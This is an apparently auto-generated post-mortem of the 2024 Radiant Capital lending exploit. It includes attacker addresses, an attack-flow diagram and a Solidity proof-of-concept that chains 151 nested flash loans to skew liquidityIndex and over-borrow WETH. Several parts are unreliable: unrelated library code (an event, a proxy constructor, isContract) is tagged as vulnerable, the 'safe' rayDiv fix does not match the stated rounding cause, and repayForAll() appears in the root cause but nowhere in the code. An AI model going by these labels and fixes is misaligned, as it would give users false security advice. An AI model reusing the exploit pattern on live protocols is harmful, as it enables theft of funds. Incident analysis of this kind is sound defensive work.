# Radiant Capital — Liquidity Index Manipulation via rayDiv Rounding Error Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-03 |
| **Protocol** | Radiant Capital |
| **Chain** | Arbitrum |
| **Loss** | ~$4,500,000 |
| **Attacker** | [0x826d5f4d](https://arbiscan.io/address/0x826d5f4d8084980366f975e10db6c4cf1f9dde6d) |
| **Attack Contract** | [0x39519c02](https://arbiscan.io/address/0x39519c027b503f40867548fb0c890b11728faa8f) |
| **Vulnerable Contract** | [Radiant 0xf4b14866](https://arbiscan.io/address/0xf4b1486dd74d07706052a33d31d7c0aafd0659e1) |
| **Root Cause** | Missing ceiling rounding in the `rayDiv()` function of an AAVE fork causes `liquidityIndex` to drift upward via accumulated error across repeated `repayForAll()` calls, allowing excessive WETH borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/RadiantCapital_exp.sol) |

---

## 1. Vulnerability Overview

Radiant Capital is a lending protocol forked from AAVE V2 that internally uses a `rayDiv()` function. By exploiting a rounding error in this function through 151 nested flash loans to manipulate the `liquidityIndex`, an attacker can borrow more WETH than the actual value of rUSDCn collateral warrants. The attacker borrowed 3M USDC from Aave V3, deposited 2M into Radiant, and then executed this process.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: rayDiv rounding error in the AAVE fork
function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 halfB = b / 2;
    return (a * RAY + halfB) / b;
    // Accumulated error from the halfB term upon repeated calls
}

// Repeated rounding error accumulates during liquidityIndex updates
function updateState() internal {
    uint256 newLiquidityIndex = rayMul(
        currentLiquidityIndex,
        calculateLinearInterest(reserve, block.timestamp)
    );
    reserve.liquidityIndex = newLiquidityIndex; // Error accumulates
}

// ✅ Safe code: use a secure fixed-point library
function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
    // Standard AAVE V3 implementation using HALF_RAY
    return (a * RAY + HALF_RAY) / b;
    // + add periodic invariant validation
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Address.sol
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {  // ❌ Vulnerability
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
```

```solidity
// File: BaseImmutableAdminUpgradeabilityProxy.sol
contract BaseImmutableAdminUpgradeabilityProxy is BaseUpgradeabilityProxy {
	address immutable ADMIN;

	constructor(address _admin) {  // ❌ Vulnerability
		ADMIN = _admin;
	}

	modifier ifAdmin() {
		if (msg.sender == ADMIN) {
			_;
		} else {
			_fallback();
		}
	}

	/**
	 * @return _address The address of the proxy admin.
	 */
	function admin() external ifAdmin returns (address _address) {
		return ADMIN;
	}

	/**
	 * @return _address The address of the implementation.
	 */
	function implementation() external ifAdmin returns (address _address) {
		return _implementation();
	}

	/**
	 * @dev Upgrade the backing implementation of the proxy.
	 * Only the admin can call this function.
	 * @param newImplementation Address of the new implementation.
	 */
	function upgradeTo(address newImplementation) external ifAdmin {
		_upgradeTo(newImplementation);
	}

	/**
	 * @dev Upgrade the backing implementation of the proxy and call a function
	 * on the new implementation.
	 * This is useful to initialize the proxied contract.
	 * @param newImplementation Address of the new implementation.
	 * @param data Data to send as msg.data in the low level call.
	 * It should include the signature and the parameters of the function to be called, as described in
	 * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding.
	 */
	function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin {
		_upgradeTo(newImplementation);
		(bool success, ) = newImplementation.delegatecall(data);
```

```solidity
// File: BaseUpgradeabilityProxy.sol
contract BaseUpgradeabilityProxy is Proxy {
	/**
	 * @dev Emitted when the implementation is upgraded.
	 * @param implementation Address of the new implementation.
	 */
	event Upgraded(address indexed implementation);  // ❌ Vulnerability

	/**
	 * @dev Storage slot with the address of the current implementation.
	 * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
	 * validated in the constructor.
	 */
	bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

	/**
	 * @dev Returns the current implementation.
	 * @return impl Address of the current implementation
	 */
	function _implementation() internal view override returns (address impl) {
		bytes32 slot = IMPLEMENTATION_SLOT;
		//solium-disable-next-line
		assembly {
			impl := sload(slot)
		}
	}

	/**
	 * @dev Upgrades the proxy to a new implementation.
	 * @param newImplementation Address of the new implementation.
	 */
	function _upgradeTo(address newImplementation) internal {
		_setImplementation(newImplementation);
		emit Upgraded(newImplementation);
	}

	/**
	 * @dev Sets the implementation address of the proxy.
	 * @param newImplementation Address of the new implementation.
	 */
	function _setImplementation(address newImplementation) internal {
		require(Address.isContract(newImplementation), "Cannot set a proxy implementation to a non-contract address");

		bytes32 slot = IMPLEMENTATION_SLOT;

		//solium-disable-next-line
		assembly {
			sstore(slot, newImplementation)
		}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Aave V3 flash: 3M USDC flash loan
  │
  ├─→ [2] Deposit 2M USDC into Radiant
  │
  ├─→ [3] 151 nested flash loans (2M USDC)
  │         └─ rayDiv rounding error accumulates on each call
  │         └─ liquidityIndex gradually manipulated
  │
  ├─→ [4] Borrow ~90.69 WETH from Radiant
  │         └─ Manipulated liquidityIndex allows excessive borrowing
  │
  ├─→ [5] Deploy HelperExploit → recover remaining USDC
  │
  ├─→ [6] Swap WETH/USDC via Uniswap V3
  │
  └─→ [7] Repay flash loan, net ~$4.5M profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IRadiant {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
}

contract AttackContract {
    IRadiant constant radiant = IRadiant(0xf4b1486dd74d07706052a33d31d7c0aafd0659e1);
    uint256 flashLoanCount;

    function executeOperation(
        address[] calldata, uint256[] calldata amounts,
        uint256[] calldata, address, bytes calldata
    ) external returns (bool) {
        if (flashLoanCount < 151) {
            flashLoanCount++;
            // [3] Accumulate rounding errors via nested flash loans
            address[] memory assets = new address[](1);
            assets[0] = USDC;
            uint256[] memory flashAmounts = new uint256[](1);
            flashAmounts[0] = 2_000_000e6;
            radiant.flashLoan(address(this), assets, flashAmounts, modes, address(this), "", 0);
        } else {
            // [4] Borrow WETH after liquidityIndex manipulation is complete
            radiant.borrow(WETH, 90.69 ether, 2, 0, address(this));
        }
        return true;
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing ceiling rounding in `rayDiv()` causes `liquidityIndex` to drift upward via accumulated error |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (repeated `repayForAll()` calls; nested flash loans serve as the mechanism for repetition) |
| **DApp Category** | AAVE-fork lending protocol |
| **Impact** | Excessive borrowing drains collateral funds |

## 6. Remediation Recommendations

1. **Apply AAVE V3 Patch**: Immediately integrate AAVE V3's improved `rayDiv` implementation and security patches
2. **Restrict Nested Flash Loans**: Limit flash loan re-entry depth within a single transaction
3. **Validate liquidityIndex Bounds**: Verify that the change in `liquidityIndex` before and after an update stays below a threshold
4. **Audit Forked Protocols**: AAVE/Compound forks must be audited by back-tracing all changes made to the original codebase

## 7. Lessons Learned

- AAVE V2 forks that do not apply the upstream security patch (ceiling rounding fix in `rayDiv()`) remain exposed to the same vulnerability.
- The rounding direction error in `rayDiv()` is the root cause; nested flash loans are merely the mechanism enabling repeated calls.
- `liquidityIndex` manipulation is a global attack that affects every lending position in the protocol.